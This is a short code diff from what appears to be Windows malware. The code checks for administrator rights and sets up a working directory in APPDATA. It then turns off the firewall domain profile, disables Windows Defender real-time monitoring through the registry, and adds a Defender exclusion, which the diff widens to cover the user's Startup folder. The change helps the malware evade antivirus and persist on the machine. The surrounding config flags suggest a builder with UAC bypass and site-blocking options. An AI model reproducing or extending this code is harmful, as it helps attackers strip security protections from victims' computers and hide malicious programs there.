@@ -3205,14 +3205,16 @@ if cc.get_uac_bypass():
 
 if IsAdmin():
     dir_name = 'rose'
-    working_dir = os.path.join(os.getenv('APPDATA'), dir_name)
+    roaming = os.getenv('APPDATA')
+    working_dir = os.path.join(roaming, dir_name)
+    startup_loc = os.path.join(roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
     
     if cc.get_disable_protectors():
         subprocess.run('netsh advfirewall set domainprofile state off', shell=True)
         subprocess.run(
             'Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1',
             shell=True)
-        subprocess.run("powershell -Command \"Add-MpPreference -ExclusionPath '{}'\"".format(working_dir),
+        subprocess.run("powershell -Command \"Add-MpPreference -ExclusionPath '{}','{}'\"".format(working_dir, startup_loc),
                        shell=True)
     if cc.get_block_sites():
         block_sites()
